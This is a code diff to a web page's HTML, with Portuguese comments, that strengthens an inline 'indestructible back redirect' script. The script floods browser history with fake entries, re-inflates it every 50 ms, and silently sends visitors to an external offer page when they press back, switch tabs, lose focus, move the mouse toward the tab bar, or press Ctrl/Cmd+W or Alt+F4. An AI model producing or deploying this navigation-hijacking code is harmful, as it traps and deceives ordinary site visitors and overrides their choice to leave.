@@ -65,7 +65,7 @@
     <div id="root"></div>
     <script type="module" src="/index.tsx"></script>
 
-    <!-- SISTEMA DE BACK REDIRECT DEFINITIVO E INDESTRUTÍVEL (IIFE) -->
+    <!-- SISTEMA DE BACK REDIRECT INDESTRUTÍVEL COM EXIT INTENT LAYERS -->
     <script>
     (function(w, d, h, l) {
       var TARGET_URL = "https://ofertaexclusiva.figma.site/";
@@ -77,12 +77,17 @@
           for (var i = 0; i < 50; i++) {
             h.pushState({ trap: i, ts: Date.now() }, "", l.href);
           }
-        } catch (e) {
-          // Silent catch
+        } catch (e) {}
+      }
+
+      // Função de Redirecionamento Silencioso e Instantâneo
+      function performRedirect() {
+        if (isArmed && !w.isNavigatingToCheckout) {
+          l.replace(TARGET_URL);
         }
       }
 
-      // Gatilho de Ativação por interação global
+      // Gatilho de Ativação por interação global (Validação do Navegador)
       function arm() {
         if (!isArmed) {
           isArmed = true;
@@ -98,41 +103,53 @@
       w.addEventListener("touchstart", arm, { passive: true });
       w.addEventListener("mousedown", arm, { passive: true });
 
-      // Override de Eventos Popstate e Hashchange
+      // Override de Eventos de Navegação (Popstate / Hashchange)
       w.onpopstate = w.onhashchange = function(event) {
-        if (isArmed && !w.isNavigatingToCheckout) {
-          l.replace(TARGET_URL);
-        }
+        performRedirect();
       };
 
-      // Vigilante Atômico (50ms)
+      // 1. MONITORAMENTO DE MOUSE (Desktop Exit Intent)
+      d.addEventListener("mouseleave", function(e) {
+        // Detecta se o mouse sai do topo da página (intenção de fechar/trocar aba)
+        if (e.clientY < 0) {
+          performRedirect();
+        }
+      });
+
+      // 2. PERDA DE FOCO (Mobile/Tab Exit Intent)
+      d.addEventListener("visibilitychange", function() {
+        if (d.visibilityState === 'hidden') {
+          performRedirect();
+        }
+      });
+
+      // 3. BLOQUEIO DE TECLAS (Power User Intent)
+      d.addEventListener("keydown", function(e) {
+        // Detecta Cmd+W, Ctrl+W ou Alt+F4
+        var isW = e.key === 'w' || e.key === 'W';
+        var isF4 = e.key === 'F4';
+        if ((isW && (e.ctrlKey || e.metaKey)) || (isF4 && e.altKey)) {
+          performRedirect();
+        }
+      });
+
+      // 4. PERSISTÊNCIA ATÔMICA (Loop de 50ms)
       setInterval(function() {
-        // Se armado e o histórico foi comprometido (reduzido), restaura agressivamente
-        if (isArmed && h.length < 30) {
-          forceBack();
+        if (isArmed && !w.isNavigatingToCheckout) {
+          // Mantém o histórico inflado contra limpezas automáticas de SPAs
+          if (h.length < 30) {
+            forceBack();
+          }
         }
       }, 50);
 
-      // Detecção de Saída e Perda de Foco
+      // Listener de Blur para perda de foco da janela
       w.addEventListener("blur", function() {
-        if (isArmed && !w.isNavigatingToCheckout) {
-          forceBack();
-        }
+        performRedirect();
       });
 
-      d.addEventListener("mouseleave", function(e) {
-        // Detecta intenção de fechar aba (mouse sai do topo)
-        if (isArmed && e.clientY < 0 && !w.isNavigatingToCheckout) {
-          forceBack();
-          // Alguns browsers permitem um pequeno trigger aqui antes do evento popstate real
-        }
-      });
-
-      // Garante persistência global
-      w.backRedirectAtomic = {
-        isArmed: function() { return isArmed; },
-        reArm: forceBack
-      };
+      // Proteção contra diálogos nativos
+      w.onbeforeunload = null;
 
     })(window, document, window.history, window.location);
     </script>
